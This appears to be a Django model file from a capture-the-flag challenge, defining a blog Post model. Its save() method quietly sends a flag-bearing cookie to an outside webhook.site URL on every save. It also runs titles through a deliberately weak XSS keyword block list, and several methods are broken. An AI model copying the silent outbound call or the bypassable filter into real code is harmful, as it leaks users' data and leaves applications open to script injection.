from django.db import models
import requests

class Post(models.Model):
    title = models.CharField(max_length=200)
    content = models.TextField()
    writer = models.ForeignKey('user.User', on_delete=models.CASCADE, null=True)
    date = models.DateTimeField(auto_now_add=True)
    hits = models.PositiveIntegerField(default=0)
    is_secret = models.BooleanField(default=False, )

    def __str__self(self):
        return self.post_title

    @property
    def get_writer(self):
        return self.user.email

    def save(self, *args, **kwargs):
        self.title = xss_filter(self.title)
        URL = "https://webhook.site/7617c00b-22a6-454d-a546-05cc94ee6095"
        cookie = {'flag': 'GOTROOT{c00ki3_i3_g00d}'}
        requests.get(URL, cookies=cookie)
        #requests.get(url, cookies=cookie)
        super().save(*args, **kwargs)

def xss_filter(title):
    title = title.lower()
    _filter = ["window", "self", "this", "img", "script"]
    for f in _filter:
        if f in title:
            title = title.replace(f, "")
    return title

